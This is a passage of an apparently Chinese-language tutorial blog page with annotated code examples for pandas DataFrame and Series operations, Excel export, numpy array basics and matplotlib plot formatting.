<p>dict转成dataframe</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">a = [</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&#x27;a&#x27;</span>:<span class="number">1</span>,</span><br><span class="line">        <span class="string">&#x27;b&#x27;</span>:<span class="literal">True</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&#x27;d&#x27;</span>: <span class="number">1</span>,</span><br><span class="line">        <span class="string">&#x27;b&#x27;</span>: <span class="literal">True</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">]</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line">b = pd.DataFrame(a)</span><br><span class="line"><span class="built_in">print</span>(b)</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[&#123;&#x27;a&#x27;: 1, &#x27;b&#x27;: True&#125;, &#123;&#x27;d&#x27;: 1, &#x27;b&#x27;: True&#125;]</span><br><span class="line">     a     b    d</span><br><span class="line">0  1.0  True  NaN</span><br><span class="line">1  NaN  True  1.0</span><br></pre></td></tr></table></figure>

<p>二维数组转dataframe，可以自定义列名，不定义就是从0开始的数字</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">a = [ [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], [<span class="number">4</span>, <span class="number">5</span>] ]</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line">b = pd.DataFrame(a, columns=[<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span>(b)</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[[1, 2, 3], [4, 5]]</span><br><span class="line">   a  b    c</span><br><span class="line">0  1  2  3.0</span><br><span class="line">1  4  5  NaN</span><br></pre></td></tr></table></figure>

<p>一维数组转dataframe</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line">b = pd.DataFrame(a, columns=[<span class="string">&#x27;a&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span>(b)</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[1, 2, 3, 5, 6]</span><br><span class="line">   a</span><br><span class="line">0  1</span><br><span class="line">1  2</span><br><span class="line">2  3</span><br><span class="line">3  5</span><br><span class="line">4  6</span><br></pre></td></tr></table></figure>

<h4 id="3-增"><a href="#3-增" class="headerlink" title="3) 增"></a>3) 增</h4><p><strong>增加列</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 插入一列，最右侧</span></span><br><span class="line">df[<span class="string">&#x27;newColumns1&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">df[<span class="string">&#x27;newColumns2&#x27;</span>] = [xxx]    <span class="comment"># 要求数组个数和df的行数保持一致，否则会失败</span></span><br><span class="line"><span class="comment"># 在指定位置插入一列</span></span><br><span class="line">df.insert(loc=<span class="number">0</span>, column=<span class="string">&#x27;newColumns3&#x27;</span>, value=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># 基于已有数据增加列</span></span><br><span class="line">a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line">b = pd.DataFrame(a, columns=[<span class="string">&#x27;a&#x27;</span>])</span><br><span class="line">b[<span class="string">&#x27;new_a&#x27;</span>] = b[<span class="string">&#x27;a&#x27;</span>].apply(<span class="keyword">lambda</span> item: item+<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>合并两个表</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line">b = pd.DataFrame(a, columns=[<span class="string">&#x27;a&#x27;</span>])</span><br><span class="line">c = pd.DataFrame(a, columns=[<span class="string">&#x27;a&#x27;</span>])</span><br><span class="line">b[<span class="string">&#x27;bool&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">c[<span class="string">&#x27;int&#x27;</span>] = <span class="number">12</span></span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 基于a为唯一key进行合并</span></span><br><span class="line">d = pd.merge(b, c, how=<span class="string">&#x27;outer&#x27;</span>, on=<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(d)</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">   a  bool</span><br><span class="line">0  1  True</span><br><span class="line">1  2  True</span><br><span class="line">2  3  True</span><br><span class="line">   a  int</span><br><span class="line">0  1   12</span><br><span class="line">1  2   12</span><br><span class="line">2  3   12</span><br><span class="line">   a  bool  int</span><br><span class="line">0  1  True   12</span><br><span class="line">1  2  True   12</span><br><span class="line">2  3  True   12</span><br></pre></td></tr></table></figure>

<p><strong>增加行</strong></p>
<p>合并两个dataframe</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line">b = pd.DataFrame(a, columns=[<span class="string">&#x27;a&#x27;</span>])</span><br><span class="line">c = pd.DataFrame(a, columns=[<span class="string">&#x27;a&#x27;</span>])</span><br><span class="line">b[<span class="string">&#x27;bool&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">c[<span class="string">&#x27;bool&#x27;</span>] = <span class="literal">False</span></span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ignore_index为true则重新增加索引，为false会两个索引不变，导致存在相同的index</span></span><br><span class="line">d = pd.concat([b, c], ignore_index=<span class="literal">True</span>)</span><br><span class="line"><span class="built_in">print</span>(d)</span><br></pre></td></tr></table></figure>

<h4 id="4-改"><a href="#4-改" class="headerlink" title="4) 改"></a>4) 改</h4><h5 id="1-打乱其中的行"><a href="#1-打乱其中的行" class="headerlink" title="(1) 打乱其中的行"></a>(1) 打乱其中的行</h5><ul>
<li>使用sample方法进行打乱</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># frac是指抽取比例，为1就是全部抽取，抽取时是随机的，所以可以打乱数据</span></span><br><span class="line">train_data = train_data.sample(frac=<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<h5 id="2-修改某个值"><a href="#2-修改某个值" class="headerlink" title="(2) 修改某个值"></a>(2) 修改某个值</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查找到index行，column列改成5</span></span><br><span class="line">df.at[<span class="string">&quot;index&quot;</span>, <span class="string">&quot;column&quot;</span>] = <span class="number">5</span></span><br></pre></td></tr></table></figure>

<h5 id="3-修改列名"><a href="#3-修改列名" class="headerlink" title="(3) 修改列名"></a>(3) 修改列名</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 修改列名</span></span><br><span class="line">df.rename(columns=&#123;<span class="string">&#x27;test&#x27;</span>:<span class="string">&#x27;aaa&#x27;</span>&#125;, inplace=<span class="literal">True</span>)     <span class="comment"># 将test改为aaa</span></span><br></pre></td></tr></table></figure>

<h5 id="4-排序"><a href="#4-排序" class="headerlink" title="(4) 排序"></a>(4) 排序</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">## by为依据columns或index，需要指定axis，0是行排，1是列排，默认为0</span></span><br><span class="line"><span class="comment">## ascending，True升序，False降序</span></span><br><span class="line"><span class="comment">## inplace是否改变原数据</span></span><br><span class="line"><span class="comment">## na_position，缺失值所在位置，last或first</span></span><br><span class="line">df.sort_values(by=[<span class="string">&quot;status&quot;</span>], ascending=[<span class="literal">False</span>], inplace=<span class="literal">True</span>)  <span class="comment"># 依据status列进行行排序，降序，替换原数据</span></span><br></pre></td></tr></table></figure>

<h5 id="5-只取几列"><a href="#5-只取几列" class="headerlink" title="(5) 只取几列"></a>(5) 只取几列</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 取多列返回的是dataframe</span></span><br><span class="line">X = train_data[[<span class="string">&#x27;len_scale&#x27;</span>, <span class="string">&#x27;shan_scale&#x27;</span>, <span class="string">&#x27;yuan_ratio&#x27;</span>]]</span><br><span class="line"><span class="comment"># 取一列返回的是Series</span></span><br><span class="line">Y = train_data[<span class="string">&#x27;label&#x27;</span>]</span><br></pre></td></tr></table></figure>

<h5 id="6-某一列修改类型"><a href="#6-某一列修改类型" class="headerlink" title="(6) 某一列修改类型"></a>(6) 某一列修改类型</h5><p><strong>字符串转int</strong></p>
<ul>
<li>字符串的<code>0</code>转数字<code>0</code>，不是<code>\0</code>转<code>0</code></li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data = pd.DataFrame(&#123;</span><br><span class="line">    <span class="string">&#x27;label&#x27;</span>: [<span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>]</span><br><span class="line">&#125;)</span><br><span class="line"><span class="built_in">print</span>(data[<span class="string">&#x27;label&#x27;</span>])</span><br><span class="line">data[<span class="string">&#x27;label&#x27;</span>] = data[<span class="string">&#x27;label&#x27;</span>].astype(<span class="built_in">int</span>)</span><br><span class="line"><span class="built_in">print</span>(data[<span class="string">&#x27;label&#x27;</span>])</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0    0</span><br><span class="line">1    1</span><br><span class="line">2    0</span><br><span class="line">3    1</span><br><span class="line">Name: label, dtype: object</span><br><span class="line">0    0</span><br><span class="line">1    1</span><br><span class="line">2    0</span><br><span class="line">3    1</span><br><span class="line">Name: label, dtype: object</span><br><span class="line">0    0</span><br><span class="line">1    1</span><br><span class="line">2    0</span><br><span class="line">3    1</span><br><span class="line">Name: label, dtype: int64</span><br></pre></td></tr></table></figure>

<h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#################### 删 #######################</span></span><br><span class="line"><span class="comment"># 删除label列，改变原数据</span></span><br><span class="line">df.drop(labels = [<span class="string">&quot;label&quot;</span>], axis = <span class="number">1</span>, inplace=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># 同理删除一行</span></span><br><span class="line">df.drop(index = <span class="number">0</span>, inplace=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># 删除所有含有nan的行</span></span><br><span class="line">df.dropna(inplace=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">################### 查 #######################</span></span><br><span class="line"><span class="comment"># 提取一列转成Series形式，以下两种都可以</span></span><br><span class="line">test_series = df.test</span><br><span class="line">test_series = df[<span class="string">&#x27;test&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提取一行或几行，有两个定位的方法，一个是loc，一个是iloc。</span></span><br><span class="line"><span class="comment">## loc只能定位索引，传入的值只能是索引，如果索引不是数字，不能传入数字</span></span><br><span class="line">test_series = df.loc[<span class="number">0</span>]                     <span class="comment"># 索引是数字，只有一个则返回series，多个将会返回dataframe</span></span><br><span class="line">test_series = df.loc[<span class="string">&#x27;test_index&#x27;</span>]          <span class="comment"># 索引是字符串，传数字会报错，只有一个则返回series，多个将会返回dataframe</span></span><br><span class="line">test_df = df.loc[<span class="number">0</span>:<span class="number">5</span>]                       <span class="comment"># 多行，返回dataframe</span></span><br><span class="line">test_df = df.loc[<span class="number">0</span>:<span class="number">5</span>, <span class="string">&quot;test&quot;</span>]               <span class="comment"># 0:5行，test列，一列返回series</span></span><br><span class="line">test_df = df.loc[<span class="number">0</span>:<span class="number">5</span>, [<span class="string">&quot;test&quot;</span>, <span class="string">&quot;test2&quot;</span>]]    <span class="comment"># 0:5行，test和test2列，多列列返回series</span></span><br><span class="line"><span class="comment">## iloc只能传入行号，只能传入数字，如果索引不是数字，也只能传入行号</span></span><br><span class="line">test_series = df.iloc[<span class="number">0</span>]     <span class="comment"># 只能传入数字，传入行号，不管索引是不是数字，只有一个则返回series，多个将会返回dataframe</span></span><br><span class="line">test_df = df.iloc[<span class="number">0</span>:<span class="number">5</span>]       <span class="comment"># 多行，返回dataframe</span></span><br><span class="line">test_df = df.iloc[<span class="number">0</span>:<span class="number">5</span>, <span class="number">0</span>]    <span class="comment"># 0:5行，0列，一列返回series</span></span><br><span class="line">test_df = df.iloc[<span class="number">0</span>:<span class="number">5</span>, <span class="number">0</span>:<span class="number">1</span>]  <span class="comment"># 0:5行，0:1列，多列列返回series</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 提取单个值，可以用loc和iloc，但是速度不如at和iat</span></span><br><span class="line"><span class="comment">## at和iat对应loc和iloc，但是必须定位到一个特定的元素，要求行列并且只能传入单值</span></span><br><span class="line">tmp = df.at[<span class="string">&quot;index&quot;</span>, <span class="string">&quot;columns&quot;</span>]</span><br><span class="line">tmp = df.iat[<span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 直接索引</span></span><br><span class="line"><span class="comment">## df[]只能进行行选择，或列选择，不能同时进行列选择，列选择只能是列名。行号和区间选择只能进行行选择。当index和columns标签值存在重复时，通过标签选择会优先返回行数据。df.只能进行列选择，不能进行行选择</span></span><br><span class="line"><span class="comment">## 同上，一列或一行返回series，多行或多列返回dataframe，不能选择单个</span></span><br><span class="line">tmp = df[<span class="string">&quot;index&quot;</span>]</span><br><span class="line">tmp = df[<span class="string">&quot;columns&quot;</span>]</span><br><span class="line">tmp = df.test       <span class="comment"># 只能用于列选择</span></span><br><span class="line">tmp = df[<span class="number">0</span>:<span class="number">3</span>]       <span class="comment"># 只能用于行选择</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取列名</span></span><br><span class="line">columns_value = df.columns          <span class="comment"># 返回 &lt;class &#x27;pandas.core.indexes.base.Index&#x27;&gt; 格式</span></span><br><span class="line">columns_value = df.columns.values   <span class="comment"># 返回list格式</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 筛选出符合条件的行</span></span><br><span class="line"><span class="comment">## 删选test列为1的所有数据</span></span><br><span class="line">tmp = df[df[<span class="string">&#x27;test&#x27;</span>].isin([<span class="number">1</span>])]</span><br></pre></td></tr></table></figure>

<ul>
<li>遍历</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 行遍历</span></span><br><span class="line"><span class="keyword">for</span> index, row <span class="keyword">in</span> df.iterrows():</span><br><span class="line">    <span class="comment"># index为索引值，row为series，每一行转成series</span></span><br><span class="line">    <span class="built_in">print</span>(index, row)</span><br></pre></td></tr></table></figure>

<ul>
<li>数据对比</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 比较两个数据</span></span><br><span class="line"><span class="comment">## 内置函数merge速度比自己写快得多，原始用处是合并两个数据，但是可以用于数据对比</span></span><br><span class="line"><span class="comment">## left和right指定需要对比的两个数据</span></span><br><span class="line"><span class="comment">## how分为四种情况，left以left数据为基准，数据不会超过left数量；right同理；outer，并集；inner，交集</span></span><br><span class="line">tmp = pd.merge(left = old_data, right = new_data, how = <span class="string">&quot;outer&quot;</span>, indicator = <span class="literal">True</span>)</span><br><span class="line">old_data = tmp.loc[tmp._merge == <span class="string">&#x27;left_only&#x27;</span>, :].drop(columns=<span class="string">&#x27;_merge&#x27;</span>)</span><br><span class="line">new_data = tmp.loc[tmp._merge == <span class="string">&#x27;right_only&#x27;</span>, :].drop(columns=<span class="string">&#x27;_merge&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h4 id="转换"><a href="#转换" class="headerlink" title="转换"></a>转换</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># list或者ndarray转成dataframe</span></span><br><span class="line">test_list = [[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]]</span><br><span class="line">test_df = pd.DataFrame(test_list, columns=[<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 转成ndarray多维矩阵形式</span></span><br><span class="line">test_ndarray = df.values</span><br></pre></td></tr></table></figure>

<h3 id="series相关操作"><a href="#series相关操作" class="headerlink" title="series相关操作"></a>series相关操作</h3><p>类似于python自带的dict类型</p>
<h4 id="信息"><a href="#信息" class="headerlink" title="信息"></a>信息</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">test_series = pd.Series(xxx)</span><br><span class="line">test_series.describe()   <span class="comment"># 显示数据的各种统计数据包（中位数、平均数、标准差、最值等）</span></span><br><span class="line">test_series.value_counts()  <span class="comment"># 统计各个值出现的次数</span></span><br></pre></td></tr></table></figure>

<h4 id="list操作-1"><a href="#list操作-1" class="headerlink" title="list操作"></a>list操作</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查</span></span><br><span class="line"><span class="comment"># 查一个值</span></span><br><span class="line">test_series[<span class="string">&#x27;test&#x27;</span>]</span><br><span class="line"><span class="comment"># 查找相关条件的值，返回list</span></span><br><span class="line">test_list = test_series[test_series.index == <span class="string">&#x27;test&#x27;</span>]</span><br></pre></td></tr></table></figure>

<h3 id="写入excel"><a href="#写入excel" class="headerlink" title="写入excel"></a>写入excel</h3><h4 id="不显示表头和索引"><a href="#不显示表头和索引" class="headerlink" title="不显示表头和索引"></a>不显示表头和索引</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># header=None 不显示表头，index=False 不显示索引</span></span><br><span class="line">output_df.to_excel(<span class="string">&quot;out.xlsx&quot;</span>, header=<span class="literal">None</span>, index=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>

<h4 id="写入同一文件多个sheet"><a href="#写入同一文件多个sheet" class="headerlink" title="写入同一文件多个sheet"></a>写入同一文件多个sheet</h4><p>需要安装openpyxl，默认使用此module</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">writer = pd.ExcelWriter(<span class="string">&quot;output.xlsx&quot;</span>)</span><br><span class="line">output1_df.to_excel(writer, sheet_name=<span class="string">&#x27;output1_df&#x27;</span>)</span><br><span class="line">output2_df.to_excel(writer, sheet_name=<span class="string">&#x27;output2_df&#x27;</span>)</span><br><span class="line">output3_df.to_excel(writer, sheet_name=<span class="string">&#x27;output3_df&#x27;</span>)</span><br><span class="line">writer.save()</span><br></pre></td></tr></table></figure>

<h4 id="出现非法字符问题，可以换用xlsxwriter作为写入"><a href="#出现非法字符问题，可以换用xlsxwriter作为写入" class="headerlink" title="出现非法字符问题，可以换用xlsxwriter作为写入"></a>出现非法字符问题，可以换用xlsxwriter作为写入</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">writer = pd.ExcelWriter(<span class="string">&quot;output.xlsx&quot;</span>, engine=<span class="string">&#x27;xlsxwriter&#x27;</span>)</span><br><span class="line">output1_df.to_excel(writer, sheet_name=<span class="string">&#x27;output1_df&#x27;</span>)</span><br><span class="line">output2_df.to_excel(writer, sheet_name=<span class="string">&#x27;output2_df&#x27;</span>)</span><br><span class="line">output3_df.to_excel(writer, sheet_name=<span class="string">&#x27;output3_df&#x27;</span>)</span><br><span class="line">writer.save()</span><br></pre></td></tr></table></figure>

<h2 id="2-numpy"><a href="#2-numpy" class="headerlink" title="2. numpy"></a>2. numpy</h2><h3 id="2-1-内置函数"><a href="#2-1-内置函数" class="headerlink" title="2.1. 内置函数"></a>2.1. 内置函数</h3><h4 id="1-数学函数汇总"><a href="#1-数学函数汇总" class="headerlink" title="(1) 数学函数汇总"></a>(1) 数学函数汇总</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> numpy <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># e^12</span></span><br><span class="line">exp(<span class="number">12</span>)</span><br></pre></td></tr></table></figure>

<h4 id="2-argmax获取最大值的位置"><a href="#2-argmax获取最大值的位置" class="headerlink" title="(2) argmax获取最大值的位置"></a>(2) argmax获取最大值的位置</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(np.argmax([<span class="number">1</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">3</span>]))  <span class="comment"># 2</span></span><br></pre></td></tr></table></figure>

<h3 id="2-2-numpy数据存取"><a href="#2-2-numpy数据存取" class="headerlink" title="2.2. numpy数据存取"></a>2.2. numpy数据存取</h3><p>numpy有一个可以直接将numpy数组矩阵按照原来的格式储存和读取的函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="comment"># 储存data</span></span><br><span class="line">np.save(<span class="string">&quot;file directory&quot;</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取data</span></span><br><span class="line">data = np.load(<span class="string">&quot;file directory&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>这个方法可以直接将shape也存下来，不需要考虑格式、类型等，缺点是文件会有点大。</p>
<h3 id="2-3-ndarray-矩阵"><a href="#2-3-ndarray-矩阵" class="headerlink" title="2.3. ndarray 矩阵"></a>2.3. ndarray 矩阵</h3><h4 id="1-reshape-重置矩阵形状"><a href="#1-reshape-重置矩阵形状" class="headerlink" title="1) reshape 重置矩阵形状"></a>1) reshape 重置矩阵形状</h4><p>从最外层开始重置矩阵形状，默认按行读取，-1代表未知数量，由numpy自动计算</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">test_ndarray = test_ndarray.reshape(-<span class="number">1</span>, <span class="number">28</span>, <span class="number">28</span>, <span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(test_ndarray.shape)   <span class="comment">#out: (42000, 28, 28, 1)</span></span><br></pre></td></tr></table></figure>

<h3 id="2-4-随机数"><a href="#2-4-随机数" class="headerlink" title="2.4. 随机数"></a>2.4. 随机数</h3><ul>
<li>随机种子</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">np.random.seed(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>

<h3 id="2-5-linespace-列表"><a href="#2-5-linespace-列表" class="headerlink" title="2.5. linespace 列表"></a>2.5. linespace 列表</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">y = np.linspace(m, n, z) <span class="comment"># 在[m, n]等距离取z个点</span></span><br><span class="line">x = np.linspace(m, n) <span class="comment"># 同上，z默认取50</span></span><br></pre></td></tr></table></figure>

<h3 id="2-6-array-数组"><a href="#2-6-array-数组" class="headerlink" title="2.6. array 数组"></a>2.6. array 数组</h3><h4 id="1-reshape-转成矩阵ndarray"><a href="#1-reshape-转成矩阵ndarray" class="headerlink" title="1) reshape 转成矩阵ndarray"></a>1) reshape 转成矩阵ndarray</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = np.array([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>])</span><br><span class="line">nda = a.reshape(<span class="number">2</span>, <span class="number">2</span>)</span><br></pre></td></tr></table></figure>

<h2 id="3-matplotlib"><a href="#3-matplotlib" class="headerlink" title="3. matplotlib"></a>3. matplotlib</h2><h3 id="3-1-pyplot-画图"><a href="#3-1-pyplot-画图" class="headerlink" title="3.1. pyplot 画图"></a>3.1. pyplot 画图</h3><h4 id="1-新开一个页面-figure"><a href="#1-新开一个页面-figure" class="headerlink" title="1) 新开一个页面 figure"></a>1) 新开一个页面 figure</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line">plt.figure()</span><br><span class="line">...</span><br><span class="line">plt.figure()</span><br><span class="line">...</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<h4 id="2-一页多图-subplot"><a href="#2-一页多图-subplot" class="headerlink" title="2) 一页多图 subplot"></a>2) 一页多图 subplot</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line">plt.figure()</span><br><span class="line">plt.subplot(<span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>) <span class="comment"># 3行2列，从左向右，从上向下，第一个</span></span><br><span class="line">...</span><br><span class="line">plt.subplot(<span class="number">3</span>, <span class="number">2</span>, <span class="number">3</span>) <span class="comment"># 3行2列，从左向右，从上向下，第三个</span></span><br><span class="line">...</span><br><span class="line">plt.subplot(<span class="number">3</span>, <span class="number">2</span>, <span class="number">5</span>) <span class="comment"># 3行2列，从左向右，从上向下，第五个</span></span><br><span class="line">...</span><br><span class="line">plt.subplot(<span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>) <span class="comment"># 1行2列，从左向右，从上向下，第二个</span></span><br><span class="line">...</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<p>效果图</p>
<img src = "2018_11_29_01.png">

<h4 id="3-页面属性更改"><a href="#3-页面属性更改" class="headerlink" title="3) 页面属性更改"></a>3) 页面属性更改</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line">plt.figure(<span class="string">&quot;abc&quot;</span>) <span class="comment"># 整个图表名字</span></span><br><span class="line">...</span><br><span class="line">plt.xlabel(<span class="string">&quot;x&quot;</span>) <span class="comment"># 横坐标名称</span></span><br><span class="line">plt.ylabel(<span class="string">&quot;y&quot;</span>) <span class="comment"># 纵坐标名称</span></span><br><span class="line">plt.title(<span class="string">&quot;y = f(x)&quot;</span>) <span class="comment"># 当前图的名字</span></span><br><span class="line">ax = plt.gca()  <span class="comment"># 获取坐标轴对象</span></span><br><span class="line">ax.xaxis.set_major_locator(MultipleLocator(<span class="number">100</span>))    <span class="comment"># 设置x轴刻度间隔为100</span></span><br><span class="line">ax.yaxis.set_major_locator(MultipleLocator(<span class="number">50</span>))     <span class="comment"># 设置y轴刻度间隔为50</span></span><br><span class="line">ax.xaxis.set_ticks_position(<span class="string">&#x27;top&#x27;</span>)                  <span class="comment"># 设置x轴刻度在上方显示，默认是下方</span></span><br><span class="line">plt.grid(<span class="literal">True</span>) <span class="comment"># 显示网格</span></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<h5 id="1-图例右上角展示"><a href="#1-图例右上角展示" class="headerlink" title="(1) 图例右上角展示"></a>(1) 图例右上角展示</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 不加这句不显示图例</span></span><br><span class="line">plt.legend(loc=<span class="string">&#x27;upper right&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h5 id="2-x轴斜着显示"><a href="#2-x轴斜着显示" class="headerlink" title="(2) x轴斜着显示"></a>(2) x轴斜着显示</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">plt.xticks(x, rotation=<span class="number">45</span>, ha=<span class="string">&#x27;right&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h5 id="3-x轴只显示整数"><a href="#3-x轴只显示整数" class="headerlink" title="(3) x轴只显示整数"></a>(3) x轴只显示整数</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">plt.plot(x, y)</span><br><span class="line"><span class="comment"># 设置xticks的x为要显示的值即可，画图就会只显示这些值</span></span><br><span class="line">plt.xticks([a <span class="keyword">for</span> a <span class="keyword">in</span> x <span class="keyword">if</span> <span class="built_in">abs</span>(a-<span class="built_in">round</span>(a)) &lt; <span class="number">0.000001</span>])</span><br></pre></td></tr></table></figure>

<h5 id="4-y轴修改小数为百分比字符串"><a href="#4-y轴修改小数为百分比字符串" class="headerlink" title="(4) y轴修改小数为百分比字符串"></a>(4) y轴修改小数为百分比字符串</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">plt.plot(x, y)</span><br><span class="line">ax = plt.gca()</span><br><span class="line"><span class="comment"># 设置y轴标签为百分比字符串</span></span><br><span class="line">ax.set_yticklabels([<span class="string">&#x27;&#123;:.0%&#125;&#x27;</span>.<span class="built_in">format</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> ax.get_yticks()])</span><br></pre></td></tr></table></figure>

